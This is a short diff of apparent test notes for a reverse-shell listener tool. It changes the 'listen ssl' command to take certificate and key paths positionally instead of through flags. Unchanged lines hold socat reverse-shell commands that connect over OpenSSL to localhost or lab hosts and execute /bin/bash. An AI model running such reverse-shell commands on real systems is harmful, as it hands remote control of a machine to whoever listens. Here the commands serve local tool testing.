@@ -1,19 +1,19 @@
 
 # test ssh reverse shell without any authentication
-listen ssl -b 4444
+listen ssl -b 4444 test/certs/cert-localhost1.pem test/certs/key-localhost1.pem
 
 socat OPENSSL:localhost:4444,verify=0 EXEC:/bin/bash
 
 
 # test ssl reverse shell with server and client authentication:
 
-listen ssl -b 4444 --cert test/certs/cert-localhost1.pem --key test/certs/enc-key-localhost1.pem --ca-cert test/certs/cert-localhost2.pem
-listen ssl -b 4444 --cert test/certs/cert-localhost1.pem --key test/certs/enc-key-localhost1.pem --password password --ca-cert test/certs/cert-localhost2.pem
+listen ssl -b 4444 test/certs/cert-localhost1.pem test/certs/enc-key-localhost1.pem --ca-cert test/certs/cert-localhost2.pem
+listen ssl -b 4444 test/certs/cert-localhost1.pem test/certs/enc-key-localhost1.pem --password password --ca-cert test/certs/cert-localhost2.pem
 
 socat OPENSSL:localhost:4444,cert=test/certs/ca-localhost2.pem,cafile=test/certs/cert-localhost1.pem,verify=1 EXEC:/bin/bash
 
 
-listen ssl -b 4444 --cert test/certs/cert-archlinux.pem --key test/certs/key-archlinux.pem --password password --ca-cert test/certs/cert-kali.pem
+listen ssl -b 4444 test/certs/cert-archlinux.pem test/certs/key-archlinux.pem --password password --ca-cert test/certs/cert-kali.pem
 
 socat OPENSSL:archlinux:4444,cert=test/certs/ca-kali.pem,cafile=test/certs/cert-archlinux.pem,verify=1 EXEC:/bin/bash
 
